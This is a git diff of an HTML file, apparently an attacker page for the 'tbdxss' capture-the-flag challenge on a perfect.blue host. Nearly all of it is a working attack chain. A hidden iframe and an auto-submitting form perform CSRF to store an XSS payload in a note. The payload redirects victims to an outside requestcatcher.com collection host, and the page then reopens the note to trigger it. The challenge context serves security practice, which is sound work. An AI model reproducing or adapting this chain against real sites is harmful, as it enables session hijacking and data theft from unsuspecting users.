@@ -1,15 +1,48 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <title>legit website</title>
 </head>
 <body>
-    <script>
-        alert(0); 
-    </script>
-    
-</body>
+   <img src="http://deelay.me/20000/http://example.com"/>
+  <iframe name="user" src="https://tbdxss.chal.perfect.blue/note"></iframe>
+
+  <script>
+    function test() { 
+
+      var iframe = document.createElement("iframe");
+      var uniqueString = "something";
+      document.body.appendChild(iframe);
+      iframe.style.display = "none";
+      iframe.contentWindow.name = uniqueString;
+
+      var form = document.createElement("form");
+      form.target = uniqueString;
+      form.action = "https://tbdxss.chal.perfect.blue/change_note";
+      form.method = "POST";
+
+      var input = document.createElement("input");
+      input.type = "hidden";
+      input.name = "data";
+      input.value = '<script>window.location="https://helloworlsdfaklfjklsfd.requestcatcher.com/xssworke" ';
+      form.appendChild(input);
+
+      document.body.appendChild(form);
+      form.submit();
+
+    }
+    test() // not sure if this works well but what i did was i setup a iframe and then sent a post to set the cookie which works it seems ( sends the post request )
+
+  document.addEventListener("DOMContentLoaded", function (event) {
+    setTimeout(function () {
+      user.location = 'https://tbdxss.chal.perfect.blue/note' // loads a ifrane with notes 
+      setTimeout(function () {
+        window.open('https://tbdxss.chal.perfect.blue/note'); // open the window with xss we se before ( note )
+
+      }, 2000);
+
+    }, 2000);
+  });
+  </script>
+  </body>
 </html>
